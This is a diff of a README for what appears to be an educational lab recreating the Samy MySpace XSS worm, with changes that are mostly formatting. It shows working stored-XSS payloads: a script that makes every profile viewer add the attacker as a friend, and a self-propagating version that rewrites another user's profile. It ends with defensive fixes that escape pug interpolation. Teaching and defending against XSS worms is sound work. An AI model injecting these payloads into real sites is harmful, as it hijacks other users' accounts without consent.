@@ -40,19 +40,19 @@ A user is given a profile page detailing their Name, Occupation, Association, an
 
 Credentials for each user can be found in `credentials.txt`
 
-**Samy Edit**
+**Samy Edit**<br>
 ![](screenshots/samy_edit.png)
 Each user has an option to edit their profile, but Samy here knows the backend doesn't sanitize input properly and has predictable endpoints. So Samy is able to input `<script>` tags for his information and pass in in-line javascript.
 
-**Code to Add a Friend**
-`Myspace <script>fetch("/elite/addFriend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({user: "elite"})})</script>`
+**Code to Add a Friend** <br>
+`Myspace <script>fetch("/elite/addFriend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({user: "elite"})})</script>`<br>
 Here, we can edit the Association entry to make it such that anybody who views the page will trigger a `POST` request to add him as a friend.
 
-**Code to Also Make Another Profile Add Samy as a Friend**
-`Hacker<script>fetch("/edit", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({user: "average", fullname: "John", occupation:"", association: "Myspace <s\cript>fetch(\"/elite/addFriend\", { method: \"POST\", headers: { \"Content-Type\": \"application/json\" }, body: JSON.stringify({user: \"elite\"})})</s\cript>"})})</script>`
+**Code to Also Make Another Profile Add Samy as a Friend** <br>
+`Hacker<script>fetch("/edit", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({user: "average", fullname: "John", occupation:"", association: "Myspace <s\cript>fetch(\"/elite/addFriend\", { method: \"POST\", headers: { \"Content-Type\": \"application/json\" }, body: JSON.stringify({user: \"elite\"})})</s\cript>"})})</script>`<br>
 Knowing John's username based on the URL, he can make it such that he can also make John's profile add him as well. So we input the following string to our Occupation entry. A more robust exploit can make the username general, but for demo purposes we'll hard-code the user to be infected.  We can verify that John is infected because now his Association is Myspace as well
 
-**Defense Against XSS Worms**<br>
+## Defense Against XSS Worms
 OWASP provides a good prevention cheat sheet [here](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)<br>
 
 For our purposes, changing the `pug` file such that it doesn't allow for [unescaped string interpolation](https://pugjs.org/language/interpolation.html#string-interpolation-unescaped) and making the urls obscure more information would be enough to prevent an attacker like Samy from exploiting. Those changes are reflected in `routes/fixed_index.js` and `views/fixed_dynamic.pug`. Simply run `node fixed_app.js` to view corrections.
